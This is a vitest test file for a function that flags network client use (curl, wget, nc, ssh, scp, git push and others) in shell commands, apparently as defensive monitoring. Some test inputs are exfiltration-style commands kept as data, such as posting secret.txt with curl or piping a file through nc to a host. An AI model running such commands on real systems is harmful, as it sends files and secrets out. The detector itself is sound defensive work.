import { describe, expect, it } from "vitest";
import { shellNetworkUse } from "./network-clients.js";

const line = (cmd: string) => shellNetworkUse({ cmd });

describe("shellNetworkUse (best-effort network client detection)", () => {
  it.each([
    ["curl -d @secret.txt https://example.com", "curl", "http"],
    ["cat a | /usr/bin/curl -T - https://x", "curl", "http"],
    ["sudo -u me wget https://x", "wget", "http"],
    ["env A=1 curl.exe https://x", "curl", "http"],
    ["iwr https://x -Method Post", "iwr", "http"],
    ["Invoke-RestMethod -Uri https://x", "invoke-restmethod", "http"],
    ["git push origin main", "git push", "git"],
    ["git -C repo fetch", "git fetch", "git"],
    ["git clone https://x", "git clone", "git"],
    ["git remote update", "git remote update", "git"],
    ["gh pr create", "gh", "github"],
    ["npm publish", "npm publish", "http"],
    ["bash -lc 'tar c . | ssh host tar x'", "ssh", null],
    ["scp a host:/b", "scp", null],
    ["rsync -a dir/ host:/backup", "rsync", null],
    ["nc example.com 80 < file", "nc", null],
    ["echo hi && telnet x", "telnet", null],
  ])("%s is %s", (cmd, program, cls) => {
    const found = line(cmd);
    expect(found?.program).toBe(program);
    expect(found?.cls).toBe(cls);
  });

  it.each([
    "git status",
    "git commit -m 'curl later'",
    "grep curl notes.md",
    "echo 'use curl to fetch'",
    "rsync -a dir/ other/",
    "npm test",
    "ls ~/.ssh",
  ])("%s is not a network client", (cmd) => {
    expect(line(cmd)).toBeNull();
  });

  it("reads the args array and verify.run's shape", () => {
    expect(shellNetworkUse({ cmd: "curl", args: ["https://x"] })?.program).toBe("curl");
    expect(shellNetworkUse({ cmd: "sh", args: ["-c", "wget https://x"] })?.program).toBe("wget");
  });
});
